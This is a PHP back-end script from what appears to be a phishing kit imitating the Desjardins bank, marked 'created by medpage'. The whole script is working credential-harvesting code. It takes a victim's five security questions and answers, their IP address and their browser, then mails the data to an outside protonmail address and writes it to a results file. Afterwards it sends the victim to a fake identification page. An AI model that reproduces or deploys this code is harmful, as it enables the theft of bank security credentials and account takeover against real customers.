<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionDetails------------------\n";
$message .= "Question 1 : ".$_POST['question1']."\n";
$message .= "Answer 1 : ".$_POST['answer1']."\n";
$message .= "Question 2 : ".$_POST['question2']."\n";
$message .= "Answer 2 : ".$_POST['answer2']."\n";
$message .= "Question 3 : ".$_POST['question3']."\n";
$message .= "Answer 3 : ".$_POST['answer3']."\n";
$message .= "Question 4 : ".$_POST['question4']."\n";
$message .= "Answer 4 : ".$_POST['answer4']."\n";
$message .= "Question 5 : ".$_POST['question5']."\n";
$message .= "Answer 5 : ".$_POST['answer5']."\n";
$message .= "------------------created by medpage----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------DESJARDINS Results------------------\n";
$send = "world009@protonmail.com";
$subject = "desjardinsResultz 2 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../../../DESJARDINSresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "indentification.php";

</script>
